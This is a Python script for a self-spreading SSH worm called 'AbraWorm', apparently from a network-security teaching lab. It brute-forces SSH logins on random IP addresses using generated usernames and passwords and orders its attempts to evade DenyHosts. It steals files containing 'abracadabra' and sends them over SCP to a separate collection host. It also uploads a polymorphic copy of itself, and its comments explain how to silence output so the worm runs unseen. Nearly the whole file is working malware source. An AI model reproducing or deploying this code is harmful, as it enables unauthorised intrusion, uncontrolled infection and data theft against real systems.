#!/usr/bin/env python

import sys
import os
import random
import paramiko
import scp
import select
import signal
import glob
import tempfile
import string
import traceback
import logging

##   You would want to uncomment the following two lines for the worm to 
##   work silently:
#sys.stdout = open(os.devnull, 'w')
#sys.stderr = open(os.devnull, 'w')

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1      # IMPORTANT:  Before changing this setting, read the last
               #             paragraph of the main comment block above. As
               #             mentioned there, you need to provide two IP
               #             addresses in order to run this code in debug 
               #             mode. 

##  The following numbers do NOT mean that the worm will attack only 3
##  hosts for 3 different usernames and 3 different passwords.  Since the
##  worm operates in an infinite loop, at each iteration, it generates a
##  fresh batch of hosts, usernames, and passwords.
NHOSTS = NUSERNAMES = NPASSWDS = 3


##  The trigrams and digrams are used for syntheizing plausible looking
##  usernames and passwords.  See the subroutines at the end of this script
##  for how usernames and passwords are generated by the worm.
trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams  = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['seed']      # need a working username for debugging
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['dees']      # need a working username for debugging
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: return ['10.0.2.10', '10.0.2.11'] 
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses 

# For the same IP address, we do not want to loop through multiple user 
# names and passwords consecutively since we do not want to be quarantined 
# by a tool like DenyHosts at the other end.  So let's reverse the order 
# of looping.
while True:
    print("[+] Starting main loop")
    usernames = get_new_usernames(NUSERNAMES)
    passwds = get_new_passwds(NPASSWDS)
    print(f"[+] Generated usernames: {usernames}")
    print(f"[+] Generated passwords: {passwds}")
    
    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print(f"\n[+] Trying password {passwd} for user {user} at IP address: {ip_address}")
                files_of_interest_at_target = []
                ssh = None
                try:
                    print("[+] Creating SSH client...")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    print(f"[+] Connecting to {ip_address} with user={user} password={passwd}")
                    ssh.connect(ip_address, port=22, username=user, password=passwd, timeout=5)
                    print("\n[+] Connected successfully")
                    
                    # Let's make sure that the target host was not previously infected
                    print("[+] Checking if target was previously infected")
                    received_list = []
                    error = []
                    print("[+] Executing 'ls' command")
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error:
                        print(f"[+] Error in ls command: {error}")
                    
                    print("[+] Reading output from ls command")
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print(f"[+] Output of 'ls' command: {received_list}")
                    
                    if ''.join(str(received_list)).find('AbraWorm') >= 0:
                        print("[+] Target machine is already infected, skipping")
                        continue
                        
                    # Look for abracadabra files
                    print("[+] Looking for files with 'abracadabra'")
                    cmd = 'grep -ls abracadabra * 2>/dev/null'
                    print(f"[+] Executing command: {cmd}")
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    
                    print("[+] Checking for errors")
                    error = stderr.readlines()
                    if error:
                        print(f"[+] Error in grep command: {error}")
                    
                    print("[+] Reading output from grep command")
                    received_list = list(map(lambda x: x.strip(), stdout.readlines()))
                    print(f"[+] Files found with 'abracadabra': {received_list}")
                    
                    # FIXED: Don't treat error messages as files
                    if not received_list:
                        print("[+] No abracadabra files found")
                        files_of_interest_at_target = []
                    else:
                        files_of_interest_at_target = received_list
                        
                    print(f"[+] Files of interest: {files_of_interest_at_target}")
                    
                    # Initialize SCP
                    print("[+] Setting up SCP connection")
                    try:
                        scpcon = scp.SCPClient(ssh.get_transport())
                    except Exception as e:
                        print(f"[+] SCP setup error: {str(e)}")
                        raise
                    
                    # Download files of interest
                    if files_of_interest_at_target:
                        print("[+] Downloading files of interest")
                        for target_file in files_of_interest_at_target:
                            try:
                                print(f"[+] Downloading {target_file}")
                                scpcon.get(target_file)
                                print(f"[+] Successfully downloaded {target_file}")
                            except Exception as e:
                                print(f"[+] Failed to download {target_file}: {str(e)}")
                    else:
                        print("[+] No files to download")
                    
                    # Create polymorphic worm variant
                    print("[+] Creating polymorphic worm variant")
                    temp_file_path = None
                    try:
                        temp_file = tempfile.NamedTemporaryFile(delete=False)
                        temp_file_path = temp_file.name
                        temp_file.close()
                        
                        print(f"[+] Created temp file at {temp_file_path}")
                        print(f"[+] Reading original worm from {sys.argv[0]}")
                        
                        with open(sys.argv[0], 'r') as original:
                            content = original.readlines()
                            print(f"[+] Read {len(content)} lines from original worm")
                        
                        # Modification 1: Add random new lines
                        for i in range(3):
                            random_position = random.randint(0, len(content)-1)
                            content.insert(random_position, "\n")
                            print(f"[+] Added newline at position {random_position}")
                        
                        # Modification 2: Add random comments
                        for i in range(2):
                            random_comment = '# ' + ''.join(random.choice(string.ascii_letters) for _ in range(20)) + '\n'
                            random_position = random.randint(0, len(content)-1)
                            content.insert(random_position, random_comment)
                            print(f"[+] Added comment at position {random_position}")
                        
                        # Write modified worm
                        print(f"[+] Writing {len(content)} lines to {temp_file_path}")
                        with open(temp_file_path, 'w') as modified:
                            modified.writelines(content)
                        
                        # Upload modified worm
                        print("[+] Uploading modified worm to target")
                        try:
                            scpcon.put(temp_file_path, 'AbraWorm.py')
                            print("[+] Successfully uploaded worm")
                        except Exception as e:
                            print(f"[+] Failed to upload worm: {str(e)}")
                            raise
                    except Exception as e:
                        print(f"[+] Error in polymorphic code: {str(e)}")
                        raise
                    finally:
                        # GUARANTEED CLEANUP: This runs whether the try or except block finished
                        if temp_file_path and os.path.exists(temp_file_path):
                            try:
                                os.unlink(temp_file_path)
                                print(f"[+] Successfully cleaned up temp file: {temp_file_path}")
                            except OSError as e:
                                print(f"[+] WARNING: Failed to clean up temp file {temp_file_path}: {e}")
                    # Close SCP connection
                    print("[+] Closing SCP connection")
                    scpcon.close()
                    
                    # Close SSH connection
                    print("[+] Closing SSH connection")
                    ssh.close()
                    
                except Exception as e:
                    print(f"[+] Exception in main try block: {str(e)}")
                    print("[+] Full traceback:")
                    traceback.print_exc()
                    if ssh:
                        print("[+] Closing SSH connection due to error")
                        try:
                            ssh.close()
                        except:
                            pass
                    continue
                
                # Try to exfiltrate files
                if files_of_interest_at_target:
                    print("\n[+] Will now try to exfiltrate the files")
                    ssh = None
                    try:
                        print("[+] Creating new SSH client for exfiltration")
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        
                        print("[+] Connecting to exfiltration host 10.0.2.9")  
                        ssh.connect('10.0.2.9', port=22, username='seed', password='dees', timeout=5)
                        
                        print("[+] Setting up SCP for exfiltration")
                        scpcon = scp.SCPClient(ssh.get_transport())
                        
                        print("\n[+] Connected to exfiltration host")
                        
                        for filename in files_of_interest_at_target:
                            print(f"[+] Uploading {filename} to exfiltration host")
                            try:
                                scpcon.put(filename)
                                print(f"[+] Successfully exfiltrated {filename}")
                            except Exception as e:
                                print(f"[+] Failed to exfiltrate {filename}: {str(e)}")
                        
                        print("[+] Closing SCP connection to exfiltration host")
                        scpcon.close()
                        
                        print("[+] Closing SSH connection to exfiltration host")
                        ssh.close()
                    except Exception as e:
                        print(f"[+] Exfiltration error: {str(e)}")
                        print("[+] Full exfiltration error traceback:")
                        traceback.print_exc()
                        if ssh:
                            try:
                                ssh.close()
                            except:
                                pass
                        print("[+] No uploading of exfiltrated files")
                        continue
    
    if debug:
        print("[+] Debug mode - breaking out of main loop")
        break
